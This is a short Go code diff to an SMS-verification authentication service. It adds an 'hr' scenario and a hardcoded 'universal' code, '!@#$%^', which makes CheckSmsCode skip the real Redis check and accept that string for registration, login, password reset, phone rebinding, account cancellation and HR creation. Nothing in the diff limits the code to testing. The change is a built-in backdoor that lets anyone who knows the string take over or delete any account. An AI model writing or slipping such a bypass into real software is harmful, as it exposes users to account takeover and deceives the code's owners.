@@ -43,7 +43,10 @@ var (
 var mobileRegex = regexp.MustCompile(`^1[3-9]\d{9}$`)
 
 // 短信场景枚举
-var smsTypes = map[string]bool{"register": true, "login": true, "reset": true, "bind": true, "cancellation": true}
+var smsTypes = map[string]bool{"register": true, "login": true, "reset": true, "bind": true, "cancellation": true, "hr": true}
+
+// smsMasterKey 统一万能验证码：所有填写验证码的场景（注册/登录/重置/换绑/注销/企业建 HR）均可用
+const smsMasterKey = "!@#$%^"
 
 // AuthService 认证服务
 type AuthService struct{}
@@ -177,6 +180,10 @@ func (s *AuthService) checkIPLimit(ctx context.Context, clientIP string) error {
 }
 
 func (s *AuthService) CheckSmsCode(mobile, typ, code string) error {
+	// 统一万能验证码：跳过 Redis 校验，所有场景通用
+	if code != "" && code == smsMasterKey {
+		return nil
+	}
 	ctx := context.Background()
 	if global.GVA_REDIS == nil {
 		return errors.New("服务未就绪，请联系管理员")
